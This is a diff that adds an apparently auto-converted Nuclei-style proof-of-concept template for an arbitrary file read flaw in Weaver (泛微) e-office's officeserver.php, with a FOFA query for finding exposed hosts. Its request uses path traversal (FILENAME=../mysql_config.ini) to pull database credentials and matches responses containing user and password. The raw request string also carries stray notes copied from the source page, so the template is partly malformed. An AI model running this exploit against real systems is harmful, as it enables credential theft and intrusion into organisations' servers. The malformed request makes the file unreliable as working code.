@@ -1,0 +1,34 @@
+id: poc-gw4xqm7xr94cehra
+info:
+  name: 泛微OA officeserver 任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gw4xqm7xr94cehra'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gw4xqm7xr94cehra
+    fofa: app="泛微-EOffice"
+http:
+- raw:
+  - 'GET /iweboffice/officeserver.php?OPTION=LOADFILE&FILENAME=../mysql_config.ini HTTP/1.1
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    ^(?=.*?user)(?=.*?password).*?$
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
